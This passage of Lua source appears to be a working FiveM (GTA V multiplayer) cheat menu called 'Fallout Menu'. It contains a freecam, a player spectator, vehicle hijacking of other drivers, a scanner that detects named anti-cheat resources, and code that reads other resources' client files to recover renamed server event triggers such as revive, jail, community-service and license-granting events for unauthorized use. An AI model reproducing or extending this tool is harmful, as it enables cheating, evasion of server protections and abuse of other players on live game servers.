               ADRVSDD:GetFunction("DisableControlAction")(0, 25, off)
               ADRVSDD:GetFunction("DisableControlAction")(1, 37, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 47, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 58, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 140, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 141, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 81, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 82, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 83, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 84, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 12, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 13, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 14, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 15, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 24, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 16, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 17, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 96, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 97, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 98, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 96, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 99, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 100, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 142, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 143, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 263, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 264, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 257, off)
               ADRVSDD:GetFunction("DisableControlAction")(1, ADRVSDD.Keys["C"], off)
               ADRVSDD:GetFunction("DisableControlAction")(1, ADRVSDD.Keys["F"], off)
               ADRVSDD:GetFunction("DisableControlAction")(1, ADRVSDD.Keys["LEFTCTRL"], off)
               ADRVSDD:GetFunction("DisableControlAction")(1, ADRVSDD.Keys["MOUSE1"], off)
               ADRVSDD:GetFunction("DisableControlAction")(1, 25, off)
               ADRVSDD:GetFunction("DisableControlAction")(1, ADRVSDD.Keys["R"], off)
               ADRVSDD:GetFunction("DisableControlAction")(1, 45, off)
               ADRVSDD:GetFunction("DisableControlAction")(1, 80, off)
               ADRVSDD:GetFunction("DisableControlAction")(1, 140, off)
               ADRVSDD:GetFunction("DisableControlAction")(1, 250, off)
               ADRVSDD:GetFunction("DisableControlAction")(1, 263, off)
               ADRVSDD:GetFunction("DisableControlAction")(1, 310, off)
               ADRVSDD:GetFunction("DisableControlAction")(1, ADRVSDD.Keys["TAB"], off)
               ADRVSDD:GetFunction("DisableControlAction")(1, ADRVSDD.Keys["SPACE"], off)
               ADRVSDD:GetFunction("DisableControlAction")(1, ADRVSDD.Keys["X"], off)
           end
       
           function ADRVSDD.FreeCam:DisableCombat(off)
               ADRVSDD:GetFunction("DisablePlayerFiring")(ADRVSDD:GetFunction("PlayerId")(), off) -- Disable weapon firing
               ADRVSDD:GetFunction("DisableControlAction")(0, 24, off) -- disable attack
               ADRVSDD:GetFunction("DisableControlAction")(0, 25, off) -- disable aim
               ADRVSDD:GetFunction("DisableControlAction")(1, 37, off) -- disable weapon select
               ADRVSDD:GetFunction("DisableControlAction")(0, 47, off) -- disable weapon
               ADRVSDD:GetFunction("DisableControlAction")(0, 58, off) -- disable weapon
               ADRVSDD:GetFunction("DisableControlAction")(0, 140, off) -- disable melee
               ADRVSDD:GetFunction("DisableControlAction")(0, 141, off) -- disable melee
               ADRVSDD:GetFunction("DisableControlAction")(0, 142, off) -- disable melee
               ADRVSDD:GetFunction("DisableControlAction")(0, 143, off) -- disable melee
               ADRVSDD:GetFunction("DisableControlAction")(0, 263, off) -- disable melee
               ADRVSDD:GetFunction("DisableControlAction")(0, 264, off) -- disable melee
               ADRVSDD:GetFunction("DisableControlAction")(0, 257, off) -- disable melee
           end
       
           function ADRVSDD.FreeCam:MoveCamera(cam, x, y, z)
               if ADRVSDD:GetFunction("UpdateOnscreenKeyboard")() ~= -1 and ADRVSDD:GetFunction("UpdateOnscreenKeyboard")() ~= 1 and ADRVSDD:GetFunction("UpdateOnscreenKeyboard")() ~= 2 then return x, y, z end
               if self.Rotating then return x, y, z end
               local curVec = vector3(x, y, z)
               local rightVec, forwardVec, upVec = ADRVSDD:GetFunction("GetCamMatrix")(cam)
               local speed = 1.0
       
               if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTCTRL"]) then
                   speed = 0.1
               elseif ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTSHIFT"]) then
                   speed = 1.8
               end
       
               if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["W"]) then
                   curVec = curVec + forwardVec * speed
               end
       
               if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["S"]) then
                   curVec = curVec - forwardVec * speed
               end
       
               if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["A"]) then
                   curVec = curVec - rightVec * speed
               end
       
               if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["D"]) then
                   curVec = curVec + rightVec * speed
               end
       
               if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["SPACE"]) then
                   curVec = curVec + upVec * speed
               end
       
               if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["X"]) then
                   curVec = curVec - upVec * speed
               end
       
               return curVec.x, curVec.y, curVec.z
           end
       
           function ADRVSDD.FreeCam:DrawMode()
               local name = self.ModeNames[self.Mode]
               ADRVSDD:ScreenText("~w~[~y~Fallout Menu~w~] Freecam Mode: ~y~" .. name, 4, 1.0, 0.5, 0.97, 0.35, 255, 255, 255, 225)
           end
       
           local _on
       
           function ADRVSDD.FreeCam:Tick()
               if not ADRVSDD:GetFunction("DoesCamExist")(self.Cam) then
                   self.Cam = ADRVSDD:GetFunction("CreateCam")("DEFAULT_SCRIPTED_CAMERA", true)
               end
       
               while ADRVSDD.Enabled do
                   ADRVSDD.FreeCam:Switcher()
                   local rot_vec = ADRVSDD:GetFunction("GetGameplayCamRot")(0)
                   Wait(0)
       
                   if self.On and not _on then
                       ADRVSDD:GetFunction("SetCamActive")(self.Cam, true)
                       ADRVSDD:GetFunction("RenderScriptCams")(true, false, false, true, true)
                       _on = true
                       local coords = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ADRVSDD:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0) + (ADRVSDD:GetFunction("GetEntityForwardVector")(ADRVSDD:GetFunction("PlayerPedId")()) * 2)
                       camX, camY, camZ = coords.x, coords.y, coords.z + 1.0
                       ADRVSDD:GetFunction("ClearPedTasks")(ADRVSDD:GetFunction("PlayerPedId")())
                       self:DeletePreview()
                       walking = false
                   elseif not self.On and _on then
                       ADRVSDD:GetFunction("FreezeEntityPosition")(ADRVSDD:GetFunction("PlayerPedId")(), false)
                       ADRVSDD:GetFunction("SetCamActive")(self.Cam, false)
                       ADRVSDD:GetFunction("RenderScriptCams")(false, false, false, false, false)
                       ADRVSDD:GetFunction("SetFocusEntity")(ADRVSDD:GetFunction("PlayerPedId")())
                       self:DisableMovement(false)
                       self:DeletePreview()
                       _on = false
                   end
       
                   if self.On and _on then
                       if not ADRVSDD:GetFunction("IsPedInAnyVehicle")(ADRVSDD:GetFunction("PlayerPedId")()) and not ADRVSDD.Config.UseAutoWalkAlt then
                           ADRVSDD:GetFunction("FreezeEntityPosition")(ADRVSDD:GetFunction("PlayerPedId")(), true)
                       elseif ADRVSDD.Config.UseAutoWalkAlt then
                           ADRVSDD:GetFunction("FreezeEntityPosition")(ADRVSDD:GetFunction("PlayerPedId")(), false)
                       end
       
                       ADRVSDD:DrawIbuttons()
                       self:DrawMode()
                       self:DisableMovement(true)
                       ADRVSDD:GetFunction("SetFocusPosAndVel")(camX, camY, camZ, 0, 0, 0)
                       ADRVSDD:GetFunction("SetCamCoord")(self.Cam, camX, camY, camZ)
                       ADRVSDD:GetFunction("SetCamRot")(self.Cam, rot_vec.x + 0.0, rot_vec.y + 0.0, rot_vec.z + 0.0)
                       camX, camY, camZ = self:MoveCamera(self.Cam, camX, camY, camZ)
                       self:ManipulationLogic(self.Cam, camX, camY, camZ)
                   end
               end
           end
       
           function ADRVSDD:Spectate(who)
               if not who then
                   self.SpectatingPlayer = nil
                   self.Spectating = false
       
                   return
               end
       
               self.SpectatingPlayer = who
               self.Spectating = true
           end
       
           function ADRVSDD:DoRCCar(driver, veh)
               if self.RCCar.On then
                   ADRVSDD:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(self.RCCar.Driver, false)
                   ADRVSDD:GetFunction("ClearPedTasks")(self.RCCar.Driver)
                   ADRVSDD:GetFunction("ClearPedSecondaryTask")(self.RCCar.Driver)
       
                   if driver then
                       self.Util:DeleteEntity(self.RCCar.Driver)
                       ADRVSDD:GetFunction("SetVehicleDoorsLockedForAllPlayers")(self.RCCar.Vehicle, false)
                       ADRVSDD:GetFunction("SetVehicleDoorsLocked")(self.RCCar.Vehicle, 7)
                   else
                       if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTSHIFT"]) then
                           TaskLeaveAnyVehicle(self.RCCar.Driver)
                           ADRVSDD:GetFunction("TaskWanderStandard")(self.RCCar.Driver)
                       else
                           ADRVSDD:GetFunction("TaskVehicleDriveWander")(self.RCCar.Driver, ADRVSDD:GetFunction("GetVehiclePedIsIn")(self.RCCar.Driver), 1000.0, 0)
                       end
       
                       ADRVSDD:GetFunction("SetVehicleDoorsLockedForAllPlayers")(self.RCCar.Vehicle, false)
                       ADRVSDD:GetFunction("SetVehicleDoorsLocked")(self.RCCar.Vehicle, 7)
                   end
               end
       
               if not driver then
                   self.RCCar.On = false
                   self.RCCar.Driver = nil
                   self.RCCar.Vehicle = nil
       
                   return
               end
       
               self.RCCar.On = true
               self.RCCar.Driver = driver
               self.RCCar.Vehicle = veh
           end
       
           ADRVSDD.Spectating = false
           local spec_on
       
           function ADRVSDD:Polar3DToWorld(entityPosition, radius, polarAngleDeg, azimuthAngleDeg)
               local polarAngleRad = polarAngleDeg * dict.math.pi / 180.0
               local azimuthAngleRad = azimuthAngleDeg * dict.math.pi / 180.0
       
               return {
                   x = entityPosition.x + radius * (dict.math.sin(azimuthAngleRad) * dict.math.cos(polarAngleRad)),
                   y = entityPosition.y - radius * (dict.math.sin(azimuthAngleRad) * dict.math.sin(polarAngleRad)),
                   z = entityPosition.z - radius * dict.math.cos(azimuthAngleRad)
               }
           end
       
           local polar, azimuth = 0, 90
       
           function ADRVSDD:SpectateTick()
               if not ADRVSDD:GetFunction("DoesCamExist")(self.SpectateCam) then
                   self.SpectateCam = ADRVSDD:GetFunction("CreateCam")("DEFAULT_SCRIPTED_CAMERA", true)
               end
       
               while ADRVSDD.Enabled do
                   Wait(0)
       
                   if self.Spectating and not spec_on then
                       ADRVSDD:GetFunction("SetCamActive")(self.SpectateCam, true)
                       ADRVSDD:GetFunction("RenderScriptCams")(true, false, false, true, true)
                       spec_on = true
                       ADRVSDD:GetFunction("ClearPedTasks")(ADRVSDD:GetFunction("PlayerPedId")())
                       walking = false
                   elseif not self.Spectating and spec_on then
                       ADRVSDD:GetFunction("FreezeEntityPosition")(ADRVSDD:GetFunction("PlayerPedId")(), false)
                       ADRVSDD:GetFunction("SetCamActive")(self.SpectateCam, false)
                       ADRVSDD:GetFunction("RenderScriptCams")(false, false, false, false, false)
                       ADRVSDD:GetFunction("SetFocusEntity")(ADRVSDD:GetFunction("PlayerPedId")())
                       self.FreeCam:DisableMovement(false)
                       spec_on = false
                   end
       
                   if self.Spectating and spec_on then
                       if not self.SpectatingPlayer or not ADRVSDD:GetFunction("DoesEntityExist")(ADRVSDD:GetFunction("GetPlayerPed")(self.SpectatingPlayer)) then
                           self.Spectating = false
                       end
       
                       local ent = ADRVSDD:GetFunction("GetPlayerPed")(self.SpectatingPlayer)
       
                       if ADRVSDD:GetFunction("IsPedInAnyVehicle")(ent) then
                           ent = ADRVSDD:GetFunction("GetVehiclePedIsIn")(ent)
                       end
       
                       local coords = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ent, 0.0, 0.0, 0.0)
       
                       if not self.Showing then
                           local magX, magY = ADRVSDD:GetFunction("GetDisabledControlNormal")(0, 1), ADRVSDD:GetFunction("GetDisabledControlNormal")(0, 2)
                           polar = polar + magX * 10
       
                           if polar >= 360 then
                               polar = 0
                           end
       
                           azimuth = azimuth + magY * 10
       
                           if azimuth >= 360 then
                               azimuth = 0
                           end
                       end
       
                       local where = ADRVSDD:Polar3DToWorld(coords, -3.5, polar, azimuth)
       
                       if not ADRVSDD:GetFunction("IsPedInAnyVehicle")(ADRVSDD:GetFunction("PlayerPedId")()) then
                           ADRVSDD:GetFunction("FreezeEntityPosition")(ADRVSDD:GetFunction("PlayerPedId")(), true)
                       end
       
                       self.FreeCam:DisableMovement(true)
                       ADRVSDD:GetFunction("SetFocusPosAndVel")(where.x, where.y, where.z, 0, 0, 0)
                       ADRVSDD:GetFunction("SetCamCoord")(self.SpectateCam, where.x, where.y, where.z)
                       ADRVSDD:GetFunction("PointCamAtEntity")(self.SpectateCam, ent)
                   end
               end
           end
       
           function ADRVSDD:ScreenText(text, font, centered, x, y, scale, r, g, b, a)
               ADRVSDD:GetFunction("SetTextFont")(font)
               ADRVSDD:GetFunction("SetTextProportional")()
               ADRVSDD:GetFunction("SetTextScale")(scale, scale)
               ADRVSDD:GetFunction("SetTextColour")(r, g, b, a)
               ADRVSDD:GetFunction("SetTextDropShadow")(0, 0, 0, 0, 255)
               ADRVSDD:GetFunction("SetTextEdge")(1, 0, 0, 0, 255)
               ADRVSDD:GetFunction("SetTextDropShadow")()
               ADRVSDD:GetFunction("SetTextOutline")()
               ADRVSDD:GetFunction("SetTextCentre")(centered)
               ADRVSDD:GetFunction("BeginTextCommandDisplayText")("STRING")
               ADRVSDD:GetFunction("AddTextComponentSubstringPlayerName")(text)
               ADRVSDD:GetFunction("EndTextCommandDisplayText")(x, y)
           end
       
           function ADRVSDD:NotificationAlpha(fade_out)
               last_alpha = ADRVSDD:GetFunction("GetGameTimer")() + dict.math.huge
               if doing_alpha and not fade_out then return end
               doing_alpha = true
       
               CreateThread(function()
                   while notif_alpha < 200 and not fade_out do
                       Wait(0)
                       notif_alpha = notif_alpha + 10
                       if notif_alpha >= 200 then break end
                   end
       
                   while not fade_out and last_alpha > ADRVSDD:GetFunction("GetGameTimer")() do
                       Wait(0)
                   end
       
                   while notif_alpha > 0 or fade_out do
                       notif_alpha = notif_alpha - 8
                       Wait(0)
                       if notif_alpha <= 0 then break end
                   end
       
                   doing_alpha = false
               end)
           end
       
           local type_colors = {
               ["INFO"] = {
                   text = "[~b~INFO~w~]"
               },
               ["WARN"] = {
                   text = "[~o~WARN~w~]"
               },
               ["ERROR"] = {
                   text = "[~r~ERROR~w~]"
               },
               ["SUCCESS"] = {
                   text = "[~g~SUCCESS~w~]"
               }
           }
       
           function ADRVSDD:TrimString(str, only_whitespace)
               local char = "%s"
               if #str >= 70 and not only_whitespace then return str:sub(1, 67) .. "..." end
       
               return dict.string.match(str, "^" .. char .. "*(.-)" .. char .. "*$") or str
           end
       
           function ADRVSDD:TrimStringBasedOnWidth(str, font, size, max_width)
               local real_width = self.Painter:GetTextWidth(str, font, size)
               if real_width <= max_width then return str end
               local out_str = str
               local cur = #str
       
               while real_width > max_width and out_str ~= "" do
                   if not str:sub(cur, cur) then break end
                   out_str = out_str:sub(1, cur - 1)
                   real_width = self.Painter:GetTextWidth(out_str, font, size)
                   cur = cur - 1
               end
       
               return out_str:sub(1, #out_str - 3) .. "..."
           end
       
           function ADRVSDD:DrawNotifications()
               notifications_h = 64
               local max_notifs_on_screen = 20
               local cur_on_screen = 0
               if not self.Config.ShowText then return end
       
               if not cur_notifs then
                   cur_notifs = #self.Notifications
                   self:NotificationAlpha()
               end
       
               if cur_notifs ~= #self.Notifications then
                   cur_notifs = #self.Notifications
                   self:NotificationAlpha()
               end
       
               if self.Showing then
                   notif_alpha = 200
               elseif not self.Showing and cur_notifs <= 0 and notif_alpha == 200 then
                   self:NotificationAlpha(true)
               end
       
               if cur_notifs <= 0 and last_alpha - self:GetFunction("GetGameTimer")() >= dict.math.huge then
                   last_alpha = self:GetFunction("GetGameTimer")() + 2000
               end
       
               if notif_alpha <= 0 then return end
       
               local n_x, n_y, n_w = self.Config.NotifX, self.Config.NotifY, self.Config.NotifW
       
               if not n_x or not n_y or not n_w then return end
               self.Painter:DrawText("~w~[~y~Fallout Menu~w~] Notifications", 4, false, n_x, n_y, 0.35, 255, 255, 255, dict.math.ceil(notif_alpha + 55))
       
               if #self.Notifications <= 0 then
                   self.Painter:DrawText("~w~No new notifications to display.", 4, false, n_x + 0.5, n_y + 33, 0.35, 255, 255, 255, dict.math.ceil(notif_alpha + 55))
               else
                   local notifY = n_y + 33
                   local s_y = notifY
                   local id = 1
       
                   for k, v in dict.pairs(self.Notifications) do
                       if cur_on_screen < max_notifs_on_screen then
                           local left = v.Expires - self:GetFunction("GetGameTimer")()
                           local str = (type_colors[v.Type] or {}).text
       
                           if str == nil then
                               str = "BAD TYPE - " .. v.Type
                               v.Message = ""
                           end
       
                           local n_alpha = notif_alpha + 50
       
                           if left <= 0 then
                               table.remove(self.Notifications, k)
                           else
                               local w_ = self.Painter:GetTextWidth(str, 4, 0.35)
                               n_alpha = dict.math.ceil(n_alpha * (left / 1000) / v.Duration)
                               self.Painter:DrawText(str, 4, false, n_x, notifY, 0.35, 255, 255, 255, _clamp(dict.math.ceil(n_alpha + 15), 0, 255))
                               self.Painter:DrawText(self:TrimStringBasedOnWidth(v.Message, 4, 0.35, n_w - w_ + 8), 4, false, n_x + w_ - 3, notifY, 0.35, 255, 255, 255, _clamp(dict.math.ceil(n_alpha + 15), 0, 255))
                               notifY = notifY + 22
                               id = id + 1
                               cur_on_screen = cur_on_screen + 1
                           end
                       end
                   end
       
                   local e_y = notifY
                   local diff = e_y - s_y
       
                   notifications_h = notifications_h + (diff - 24)
               end
       
               self.Painter:DrawRect(n_x, n_y, 420, notifications_h, 0, 0, 0, notif_alpha)
               self.Painter:DrawRect(n_x, n_y + 29, 420, 2, self.Tertiary[1], self.Tertiary[2], self.Tertiary[3], notif_alpha + 55)
           end
       
           local text_alpha = 255
       
           CreateThread(function()
               local branding = {
                   name = "[~y~" .. ADRVSDD.Name .. "~w~]",
                   resource = "Resource: ~y~" .. ADRVSDD:GetFunction("GetCurrentResourceName")(),
                   ip = "IP: ~y~" .. ADRVSDD:GetFunction("GetCurrentServerEndpoint")(),
                   id = "ID: ~y~" .. ADRVSDD:GetFunction("GetPlayerServerId")(ADRVSDD:GetFunction("PlayerId")()),
                   veh = "Vehicle: ~y~%s",
                   build = "" .. " ~w~Build (" .. ADRVSDD.Version .. ")"
               }
       
               while ADRVSDD.Enabled do
                   Wait(0)
       
                   if not ADRVSDD.Config.ShowText then
                       text_alpha = _lerp(0.05, text_alpha, -255)
                   else
                       text_alpha = _lerp(0.05, text_alpha, 255)
                   end
       
                   text_alpha = dict.math.ceil(text_alpha)
       
                   if text_alpha > 0 then
                       local veh = ADRVSDD:GetFunction("GetVehiclePedIsIn")(ADRVSDD:GetFunction("PlayerPedId")())
                       local br_wide = _text_width(branding.name)
                       local r_wide = _text_width(branding.resource)
                       local ip_wide = _text_width(branding.ip)
                       local id_wide = _text_width(branding.id)
                       local b_wide = _text_width(branding.build)
                       local v_wide
                       local curY = 0.895
       
                       if ADRVSDD:GetFunction("DoesEntityExist")(veh) then
                           v_wide = _text_width(v_str:format(GetDisplayNameFromVehicleModel(GetEntityModel(veh))))
                           curY = 0.875
                       end
       
                       ADRVSDD:ScreenText(branding.name, 4, 0.0, 1.0 - br_wide, curY, 0.35, 255, 255, 255, text_alpha)
                       curY = curY + 0.02
                       ADRVSDD:ScreenText(branding.resource, 4, 0.0, 1.0 - r_wide, curY, 0.35, 255, 255, 255, text_alpha)
                       curY = curY + 0.02
                       ADRVSDD:ScreenText(branding.ip, 4, 0.0, 1.0 - ip_wide, curY, 0.35, 255, 255, 255, text_alpha)
                       curY = curY + 0.02
                       ADRVSDD:ScreenText(branding.id, 4, 0.0, 1.0 - id_wide, curY, 0.35, 255, 255, 255, text_alpha)
                       curY = curY + 0.02
       
                       if ADRVSDD:GetFunction("DoesEntityExist")(veh) then
                           ADRVSDD:ScreenText(branding.veh:format(GetDisplayNameFromVehicleModel(GetEntityModel(veh))), 4, 0.0, 1.0 - v_wide, curY, 0.35, 255, 255, 255, text_alpha)
                           curY = curY + 0.02
                       end
       
                       ADRVSDD:ScreenText(branding.build, 4, 0.0, 1.0 - b_wide, curY, 0.35, 255, 255, 255, text_alpha)
                   end
               end
           end)
       
           local RList = {
               {
                   Resource = "alpha-tango-golf",
                   Name = "~b~ATG",
                   Pattern = function(res, resources)
                       for k, v in dict.pairs(resources) do
                           if v == res then return true end
                       end
       
                       return false
                   end
               },
               {
                   Resource = "screenshot-basic",
                   Name = "~g~screenshot-basic",
                   Pattern = function(res, resources)
                       for k, v in dict.pairs(resources) do
                           if v == res then return true end
                       end
       
                       return false
                   end
               },
               {
                   Resource = "anticheese-anticheat",
                   Name = "~g~AntiCheese",
                   Pattern = function(res, resources)
                       for k, v in dict.pairs(resources) do
                           if v == res then return true end
                       end
       
                       return false
                   end
               },
               {
                   Resource = "ChocoHax",
                   Name = "~r~ChocoHax",
                   Pattern = function() return ChXaC ~= nil end
               }
           }
       
           local resources = {}
       
           function ADRVSDD:RunACChecker()
               ADRVSDD:Print("[AC Checker] Checking...")
       
               for i = 1, ADRVSDD:GetFunction("GetNumResources")() do
                   resources[i] = ADRVSDD:GetFunction("GetResourceByFindIndex")(i)
               end
       
               for _, dat in dict.pairs(RList) do
                   if dat.Pattern(dat.Resource, resources) then
                       self:AddNotification("WARN", dat.Name .. " ~w~Detected!", 30000)
                       ADRVSDD:Print("[AC Checker] Found ^3" .. dat.Resource .. "^7")
                   end
               end
           end
       
           local function _split(content, pattern)
               local lines = {}
       
               for s in content:gmatch(pattern) do
                   lines[#lines + 1] = s
               end
       
               return lines
           end
       
           local function _find(tab, what)
               local ret = {}
       
               for id, val in dict.pairs(tab) do
                   if val == what or val:find(what) then
                       ret[#ret + 1] = id
                   end
               end
       
               return ret
           end
       
           local function _get_depth(line, lines, deep)
               local out = {}
       
               for i = -deep, deep do
                   out[line + i] = lines[line + i]
               end
       
               return out
           end
       
           ADRVSDD.NotifiedDyanmic = {}
       
           local function _replaced(res, data)
               local replaced
               local contents = ADRVSDD:GetFunction("LoadResourceFile")(res, data.File)
               if not contents or contents == "nil" or contents:len() <= 0 then return end
               local lines = _split(contents, "[^\r\n]+")
       
               for _, dat in dict.pairs(data.KnownTriggers) do
                   local content = ""
                   local line
       
                   if dat.LookFor then
                       local _lines = _find(lines, dat.LookFor)
       
                       if _lines then
                           for k, _line in dict.pairs(_lines) do
                               local depth = dat.Depth or 3
                               local possible = _get_depth(_line, lines, depth)
       
                               for _, val in dict.pairs(possible) do
                                   if val then
                                       local match
       
                                       for _, x in dict.pairs(dat.Strip) do
                                           if val:find(x) then
                                               if match == val then break end
                                               match = val
                                           else
                                               match = nil
                                           end
                                       end
       
                                       if match then
                                           content = match
                                           break
                                           break
                                       end
                                   end
                               end
                           end
                       end
                   else
                       content = lines[dat.Line]
                   end
       
                   if content then
                       local contains
       
                       for _, strip in dict.pairs(dat.Strip) do
                           if not contains then
                               contains = content:find(strip) ~= nil
                           end
       
                           content = content:gsub(strip, "")
                       end
       
                       content = ADRVSDD:TrimString(content, true)
                       ADRVSDD.DynamicTriggersasdf[res] = ADRVSDD.DynamicTriggersasdf[res] or {}
       
                       if contains and content ~= dat.Trigger then
                           replaced = true
       
                           if (content:find("'" .. dat.Trigger .. "'") or content:find("\"" .. dat.Trigger .. "\"")) and not dat.Force then
                               content = dat.Trigger
                               replaced = false
                           end
       
                           ADRVSDD.DynamicTriggersasdf[res][dat.Trigger] = content
       
                           if replaced then
                               ADRVSDD:Print("[Dynamic Triggers] ^5Replaced trigger ^6" .. dat.Trigger .. " ^7to ^3" .. content .. "^7")
                           end
                       elseif contains and content == dat.Trigger then
                           ADRVSDD.DynamicTriggersasdf[res][dat.Trigger] = dat.Trigger
                           ADRVSDD:Print("[Dynamic Triggers] ^2Unchanged ^7trigger ^6" .. dat.Trigger .. "^7")
                           replaced = true
                       else
                           ADRVSDD:AddNotification("ERROR", "Failed to get dynamic trigger " .. dat.Trigger, 20000)
                           ADRVSDD:Print("[Dynamic Triggers] ^1Failed ^7to get trigger ^6" .. dat.Trigger .. "^7")
                       end
                   else
                       ADRVSDD:Print("[Dynamic Triggers] Resource not found. (" .. res .. ")")
                   end
               end
       
               return replaced
           end
       
           local Ibuttons = nil
           local _buttons = {}
       
           function ADRVSDD:SetIbuttons(buttons)
               buttons = buttons or _buttons
       
               if not ADRVSDD:GetFunction("HasScaleformMovieLoaded")(Ibuttons) then
                   Ibuttons = ADRVSDD:GetFunction("RequestScaleformMovie")("INSTRUCTIONAL_BUTTONS")
       
                   while not ADRVSDD:GetFunction("HasScaleformMovieLoaded")(Ibuttons) do
                       Wait(0)
                   end
               else
                   Ibuttons = ADRVSDD:GetFunction("RequestScaleformMovie")("INSTRUCTIONAL_BUTTONS")
       
                   while not ADRVSDD:GetFunction("HasScaleformMovieLoaded")(Ibuttons) do
                       Wait(0)
                   end
               end
       
               local sf = Ibuttons
               local w, h = ADRVSDD:GetFunction("GetActiveScreenResolution")()
               ADRVSDD:GetFunction("BeginScaleformMovieMethod")(sf, "CLEAR_ALL")
               ADRVSDD:GetFunction("EndScaleformMovieMethodReturnValue")()
       
               for i, btn in dict.pairs(buttons) do
                   ADRVSDD:GetFunction("BeginScaleformMovieMethod")(sf, "SET_DATA_SLOT")
                   ADRVSDD:GetFunction("ScaleformMovieMethodAddParamInt")(i - 1)
                   ADRVSDD:GetFunction("ScaleformMovieMethodAddParamTextureNameString")(btn[1])
                   ADRVSDD:GetFunction("ScaleformMovieMethodAddParamTextureNameString")(btn[2])
                   ADRVSDD:GetFunction("EndScaleformMovieMethodReturnValue")()
               end
       
               ADRVSDD:GetFunction("BeginScaleformMovieMethod")(sf, "DRAW_INSTRUCTIONAL_BUTTONS")
               ADRVSDD:GetFunction("ScaleformMovieMethodAddParamInt")(layout)
               ADRVSDD:GetFunction("EndScaleformMovieMethodReturnValue")()
           end
       
           function ADRVSDD:DrawIbuttons()
               if ADRVSDD:GetFunction("HasScaleformMovieLoaded")(Ibuttons) then
                   ADRVSDD:GetFunction("DrawScaleformMovie")(Ibuttons, 0.5, 0.5, 1.0, 1.0, 255, 255, 255, 255)
                   self:SetIbuttons()
               end
           end
       
           local TEList = {
               {
                   Resource = "chat",
                   File = "client/cl_chat.lua",
                   KnownTriggers = {
                       {
                           Trigger = "_chat:messageEntered",
                           LookFor = "ExecuteCommand%(",
                           Strip = {"TriggerServerEvent%('", "', (.*)"}
                       }
                   },
                   Name = "Chat",
                   Replacement = function(res, data) return _replaced(res, data) end
               },
               {
                   Resource = "esx_ambulancejob",
                   File = "client/main.lua",
                   KnownTriggers = {
                       {
                           Trigger = "esx_ambulancejob:revive",
                           LookFor = "local playerPed = PlayerPedId%(%)",
                           Strip = {"AddEventHandler%('", "', (.*)"}
                       }
                   },
                   Name = "~g~ESX ~w~Ambulance Job",
                   Replacement = function(res, data) return _replaced(res, data) end
               },
               {
                   Resource = "gcphone",
                   File = "client/twitter.lua",
                   KnownTriggers = {
                       {
                           Trigger = "gcPhone:twitter_postTweets",
                           LookFor = "RegisterNUICallback%('twitter_postTweet', function%(data, cb%)",
                           Depth = 2,
                           Strip = {"TriggerServerEvent%('", "', (.*)"}
                       }
                   },
                   Name = "GCPhone",
                   Replacement = function(res, data) return _replaced(res, data) end
               },
               {
                   Resource = "esx_policejob",
                   File = "client/main.lua",
                   KnownTriggers = {
                       {
                           Trigger = "esx_communityservice:sendToCommunityService",
                           LookFor = "menu.close%(%)",
                           Strip = {"TriggerServerEvent%(\"", "\", (.*)"}
                       }
                   },
                   Name = "~g~ESX ~w~Police Job",
                   Replacement = function(res, data) return _replaced(res, data) end
               },
               {
                   Resource = "esx-qalle-jail",
                   File = "client/client.lua",
                   KnownTriggers = {
                       {
                           Trigger = "esx-qalle-jail:jailPlayer",
                           LookFor = "ESX.ShowNotification%(\"No players nearby!\"%)",
                           Strip = {"TriggerServerEvent%(\"", "\", (.*)"}
                       }
                   },
                   Name = "~g~ESX ~w~Qalle Jail",
                   Replacement = function(res, data) return _replaced(res, data) end
               },
               {
                   Resource = "esx_dmvschool",
                   File = "client/main.lua",
                   KnownTriggers = {
                       {
                           Trigger = "esx_dmvschool:addLicense",
                           LookFor = "ESX.ShowNotification%(_U%('passed_test'%)%)",
                           Strip = {"TriggerServerEvent%('", "', (.*)"}
                       }
                   },
                   Name = "~g~ESX ~w~DMV School",
                   Replacement = function(res, data) return _replaced(res, data) end
               },
               {
                   Resource = "CarryPeople",
                   File = "cl_carry.lua",
                   KnownTriggers = {
                       {
                           Trigger = "CarryPeople:sync",
                           LookFor = "carryingBackInProgress = true",
                           Strip = {"TriggerServerEvent%('", "', (.*)"}
                       },
                       {
                           Trigger = "CarryPeople:stop",
                           LookFor = "if target ~= 0 then",
                           Strip = {"TriggerServerEvent%(\"", "\", (.*)"}
                       }
                   },
                   Name = "CarryPeople",
